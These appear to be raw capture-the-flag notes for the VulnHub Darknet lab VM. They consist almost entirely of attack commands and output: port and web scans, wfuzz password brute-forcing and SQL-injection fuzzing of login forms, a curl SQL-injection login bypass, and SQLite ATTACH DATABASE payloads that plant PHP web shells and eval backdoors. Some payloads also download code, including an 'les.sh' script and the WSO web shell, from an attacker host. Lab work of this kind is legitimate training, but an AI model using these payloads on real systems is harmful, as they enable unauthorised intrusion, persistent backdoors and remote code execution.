
https://www.vulnhub.com/entry/darknet-10,120/


https://leonjza.github.io/blog/2016/06/16/rooting-darknet/#888-authentication-bypass




└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.53
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 10:28 CEST
Nmap scan report for 192.168.110.53
Host is up (0.00044s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42110/udp6  status
|   100024  1          44595/udp   status
|   100024  1          51000/tcp6  status
|_  100024  1          56607/tcp   status
56607/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:35:C7:24 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.110.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds

└─$ dirb http://192.168.110.53

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep 22 10:30:56 2021
URL_BASE: http://192.168.110.53/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.53/ ----
==> DIRECTORY: http://192.168.110.53/access/                                                                                                                                                
+ http://192.168.110.53/cgi-bin/ (CODE:403|SIZE:290)
+ http://192.168.110.53/index (CODE:200|SIZE:378)
+ http://192.168.110.53/index.html (CODE:200|SIZE:378)
+ http://192.168.110.53/server-status (CODE:403|SIZE:295)



└─$ nikto -h 192.168.110.53
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.53
+ Target Hostname:    192.168.110.53
+ Target Port:        80
+ Start Time:         2021-09-22 10:38:18 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Server may leak inodes via ETags, header found with file /, inode: 46398, size: 378, mtime: Mon Mar 23 07:10:38 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /access/: Directory indexing found.
+ OSVDB-3092: /access/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-09-22 10:38:25 (GMT2) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




└─$ cat 888.darknet.com.backup 
<VirtualHost *:80>
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
</VirtualHost>



<input class="textbox" type="text" name="username" placeholder="Usuario" size="18"><br><br>
<input class="textbox" type="password" name="password" placeholder="Clave" size="18"><br><br>
<input class="textbox" type="submit" name="action" value="Login">


wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d "username=FUZZ&password=password&action=Login" --hc 200 http://888.darknet.com/index.php
wfuzz -c -w /usr/share/wordlists/wfuzz/vulns/sql_inj.txt -d "username=FUZZ&password=password&action=Login" --hc 200 http://888.darknet.com/index.php
wfuzz -c -w /usr/share/wordlists/wfuzz/vulns/sql_inj.txt -d "username=devnull&password=FUZZ&action=Login" --hc 200 http://888.darknet.com/index.php
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=devnull&password=FUZZ&action=Login" --hc 200 http://888.darknet.com/index.php 
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=devnull&password=FUZZ&action=Login" http://888.darknet.com/index.php 
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admin&password=FUZZ&action=Login" --hc 200 http://888.darknet.com/index.php


curl -c cookie --data-urlencode "username=devnull' or '1" --data-urlencode "password=password" --data-urlencode "action=Login" http://888.darknet.com/main.php 


<textarea class="textbox" name="sql" cols="50" rows="10"></textarea><br><br>
<input class="textbox" type="submit" name="action" value="Exec">


ATTACH DATABASE '/home/devnull/public_html/img/phpinfo.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('<?php phpinfo(); ?>');

ATTACH DATABASE '/home/devnull/public_html/img/shell.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET['cmd']); ?>');


ATTACH DATABASE '/home/devnull/public_html/img/files.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php if($_GET['a'] == 'ls') { print_r(scandir($_GET['p'])); } if($_GET['a'] == 'cat') { print_r(readfile($_GET['p'])); } ?>");


ATTACH DATABASE '/home/devnull/public_html/img/get.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php $content = file_get_contents("http://192.168.110.1:8888/les.sh"); echo $content ?>");


attach database '/home/devnull/public_html/img/backdoor.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $_REQUEST[e] ? eval( $_REQUEST[e] ) : exit; ?>");


 ServerName signal8.darknet.com ServerAdmin errorlevel@darknet.com DocumentRoot /home/errorlevel/public_html 



http://signal8.darknet.com/xpanel/
<input class="textbox" type="text" name="username" size="18" placeholder="Usuario"><p>
<input class="textbox" type="password" name="password" size="18" placeholder="Clave"></p><p>
<input class="textbox" type="submit" name="Action" value="Login">


wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d "username=FUZZ&password=password&Action=Login" --hc 200 http://signal8.darknet.com/xpanel/
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admin&password=FUZZ&Action=Login" --hc 200 http://signal8.darknet.com/xpanel/
└─$ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=devnull&password=FUZZ&Action=Login"  http://signal8.darknet.com/xpanel/
└─$ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=errorlevel&password=FUZZ&Action=Login"  http://signal8.darknet.com/xpanel/
└─$ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admin&password=FUZZ&Action=Login"  http://signal8.darknet.com/xpanel/


└─$ wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt  http://signal8.darknet.com/contact.php?id=FUZZ

attach database '/home/devnull/public_html/img/rfi.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $content = file_get_contents("http://192.168.110.1:8888/wso/wso.php"); $myfile = fopen("/home/devnull/public_html/img/wso.php", "w") or die("Unable to open file!"); fwrite($myfile, $content);fclose($myfile); ?>");

